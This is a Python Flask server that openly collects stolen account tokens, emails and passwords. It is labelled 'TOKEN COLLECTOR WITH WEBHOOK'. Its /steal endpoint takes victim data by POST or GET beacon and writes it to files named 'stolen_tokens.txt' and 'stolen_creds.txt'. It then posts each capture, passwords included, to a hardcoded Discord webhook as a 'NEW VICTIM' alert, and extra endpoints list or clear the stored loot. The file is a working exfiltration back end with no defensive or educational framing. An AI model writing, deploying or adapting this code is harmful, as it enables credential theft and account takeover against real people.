from flask import Flask, request, jsonify
from flask_cors import CORS
import json
import os
from datetime import datetime
import requests
import threading

app = Flask(__name__)
CORS(app)

# ============================================
# CONFIGURATION
# ============================================
WEBHOOK_URL = "https://discord.com/api/webhooks/1531349836236853310/e3j8HLQ315762ZJUztazDf_2b6-sBAVu_f9JIwY-anPIeRBG6KeDEGTJLcLLZ5bBS88j"

TOKENS_FILE = 'stolen_tokens.txt'
CREDS_FILE = 'stolen_creds.txt'

# Ensure files exist
for f in [TOKENS_FILE, CREDS_FILE]:
    if not os.path.exists(f):
        open(f, 'w').close()

def send_webhook(token_data, cred_data=None):
    """Send stolen data to Discord webhook"""
    
    embeds = []
    
    # Token embed
    if token_data:
        token = token_data.get('token', 'Unknown')
        embed = {
            "title": "🎯 TOKEN STOLEN",
            "color": 16711680,
            "fields": [
                {"name": "Token", "value": f"```{token[:50]}...```", "inline": False},
                {"name": "Full Token", "value": f"||{token}||", "inline": False},
                {"name": "User Agent", "value": token_data.get('userAgent', 'Unknown')[:100], "inline": True},
                {"name": "URL", "value": token_data.get('url', 'Unknown'), "inline": True},
                {"name": "Referrer", "value": token_data.get('referrer', 'Unknown'), "inline": True},
                {"name": "Timestamp", "value": token_data.get('timestamp', datetime.now().isoformat()), "inline": True}
            ],
            "footer": {"text": f"IP: {token_data.get('ip', 'Unknown')}"},
            "timestamp": datetime.now().isoformat()
        }
        embeds.append(embed)
    
    # Credentials embed
    if cred_data:
        embed2 = {
            "title": "🔐 CREDENTIALS STOLEN",
            "color": 16755200,
            "fields": [
                {"name": "Email", "value": cred_data.get('email', 'Unknown'), "inline": True},
                {"name": "Password", "value": f"||{cred_data.get('password', 'Unknown')}||", "inline": True},
                {"name": "Timestamp", "value": cred_data.get('timestamp', datetime.now().isoformat()), "inline": True}
            ],
            "timestamp": datetime.now().isoformat()
        }
        embeds.append(embed2)
    
    # Send to webhook
    data = {
        "content": "@everyone **NEW VICTIM**",
        "embeds": embeds
    }
    
    try:
        r = requests.post(WEBHOOK_URL, json=data, timeout=5)
        if r.status_code == 204:
            print("[WEBHOOK] Sent successfully")
        else:
            print(f"[WEBHOOK] Failed with status: {r.status_code}")
    except Exception as e:
        print(f"[WEBHOOK] Error: {e}")

@app.route('/steal', methods=['GET', 'POST'])
def steal():
    """Main endpoint - receives and forwards to webhook"""
    
    if request.method == 'POST':
        data = request.get_json()
        if not data:
            return jsonify({'error': 'No JSON data'}), 400
        
        print(f"[RECEIVED] {json.dumps(data, indent=2)}")
        
        token_data = None
        cred_data = None
        
        # Extract token
        if 'token' in data:
            token = data['token']
            if token and len(token) > 30:
                token_data = {
                    'token': token,
                    'userAgent': data.get('userAgent', 'Unknown'),
                    'url': data.get('url', 'Unknown'),
                    'referrer': data.get('referrer', 'Unknown'),
                    'ip': request.remote_addr,
                    'timestamp': data.get('timestamp', datetime.now().isoformat())
                }
                with open(TOKENS_FILE, 'a', encoding='utf-8') as f:
                    f.write(f"{datetime.now().isoformat()} | {json.dumps(token_data)}\n")
                print(f"[TOKEN] Stored: {token[:20]}...")
        
        # Extract credentials
        if 'email' in data and 'password' in data:
            cred_data = {
                'email': data['email'],
                'password': data['password'],
                'timestamp': data.get('timestamp', datetime.now().isoformat())
            }
            with open(CREDS_FILE, 'a', encoding='utf-8') as f:
                f.write(f"{datetime.now().isoformat()} | {json.dumps(cred_data)}\n")
            print(f"[CREDS] Stored: {data['email']}:{data['password']}")
        
        # Send to webhook
        if token_data or cred_data:
            threading.Thread(target=send_webhook, args=(token_data, cred_data)).start()
        
        return jsonify({'status': 'ok'}), 200
    
    elif request.method == 'GET':
        token = request.args.get('token')
        if token and len(token) > 30:
            token_data = {
                'token': token,
                'method': 'GET_beacon',
                'ip': request.remote_addr,
                'timestamp': datetime.now().isoformat()
            }
            with open(TOKENS_FILE, 'a', encoding='utf-8') as f:
                f.write(f"{datetime.now().isoformat()} | {json.dumps(token_data)}\n")
            print(f"[TOKEN] Received via GET: {token[:20]}...")
            threading.Thread(target=send_webhook, args=(token_data, None)).start()
        return 'OK', 200

@app.route('/tokens', methods=['GET'])
def view_tokens():
    if not os.path.exists(TOKENS_FILE):
        return jsonify([])
    with open(TOKENS_FILE, 'r') as f:
        lines = f.readlines()
    tokens = []
    for line in lines:
        try:
            parts = line.split(' | ')
            if len(parts) == 2:
                data = json.loads(parts[1].strip())
                tokens.append(data)
        except:
            continue
    return jsonify(tokens)

@app.route('/creds', methods=['GET'])
def view_creds():
    if not os.path.exists(CREDS_FILE):
        return jsonify([])
    with open(CREDS_FILE, 'r') as f:
        lines = f.readlines()
    creds = []
    for line in lines:
        try:
            parts = line.split(' | ')
            if len(parts) == 2:
                data = json.loads(parts[1].strip())
                creds.append(data)
        except:
            continue
    return jsonify(creds)

@app.route('/clear', methods=['POST'])
def clear_data():
    for f in [TOKENS_FILE, CREDS_FILE]:
        open(f, 'w').close()
    return jsonify({'status': 'cleared'})

if __name__ == '__main__':
    print("="*50)
    print("TOKEN COLLECTOR WITH WEBHOOK")
    print("="*50)
    print(f"Webhook: {WEBHOOK_URL[:50]}...")
    print(f"Endpoint: http://0.0.0.0:5000/steal")
    print("="*50)
    app.run(host='0.0.0.0', port=5000, debug=False, threaded=True)
